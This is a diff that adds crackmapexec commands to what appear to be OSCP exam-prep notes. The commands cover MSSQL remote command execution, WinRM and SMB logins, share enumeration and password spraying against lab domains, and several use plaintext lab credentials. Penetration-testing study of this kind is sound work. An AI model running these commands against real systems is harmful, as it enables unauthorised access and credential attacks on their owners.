@@ -61,7 +61,39 @@ IconIndex=1
 ```
 OffSec.url
 
+```
+crackmapexec mssql $IP -d oscp.exam -u username -p passowrd
+```
 
+```
+crackmapexec mssql $IP -d oscp.exam -u username -p passowrd -x 'command to run'
+```
 
+```
+crackmapexec winrm TARGET -u fmcsorely -p CrabSharkJellyfish192
+```
 
+```
+crackmapexec smb TARGET -u fmcsorley -p CrabSharkJellyfish192 --shares
+```
+
+```
+crackmapexec smb TARGET -u usernames.txt -p passwords.txt --continue-on-success
+```
+
+```
+crackmapexec smb TARGET -u john -p "dqsTwTpZPn#nL" --shares
+```
+
+```
+crackmapexec smb TARGET -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+```
+
+```
+crackmapexec smb TARGET -u dave -p 'Flowers1' -d corp.com
+```
+
+```
+crackmapexec smb TARGET -u users.txt -p 'VimForPowerShell123!' -d corp.com --continue-on-success
+```
 
